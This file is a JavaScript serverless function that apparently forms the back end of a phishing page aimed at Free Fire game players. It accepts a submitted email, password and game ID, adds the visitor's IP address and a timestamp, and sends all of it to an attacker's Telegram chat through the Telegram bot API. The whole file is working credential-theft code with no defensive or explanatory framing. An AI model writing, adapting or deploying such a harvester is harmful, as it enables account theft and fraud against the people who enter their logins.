exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  const { email, password, ffId } = JSON.parse(event.body);

  if (!email || !password || !ffId) {
    return { statusCode: 400, body: JSON.stringify({ ok: false }) };
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return { statusCode: 500, body: JSON.stringify({ ok: false, error: 'env missing' }) };
  }

  const ip = event.headers['x-forwarded-for'] || event.headers['client-ip'] || '-';
  const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  const text =
    '🎯 DATA BARU MASUK\n' +
    '━━━━━━━━━━━━━━━\n' +
    '📧 Email : ' + email + '\n' +
    '🔑 Password : ' + password + '\n' +
    '🎮 ID FF : ' + ffId + '\n' +
    '🕐 Waktu : ' + waktu + '\n' +
    '🌐 IP : ' + ip;

  try {
    const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });
    const data = await res.json();
    if (!data.ok) {
      return { statusCode: 500, body: JSON.stringify({ ok: false }) };
    }
    return { statusCode: 200, body: JSON.stringify({ ok: true }) };
  } catch (e) {
    return { statusCode: 500, body: JSON.stringify({ ok: false }) };
  }
};
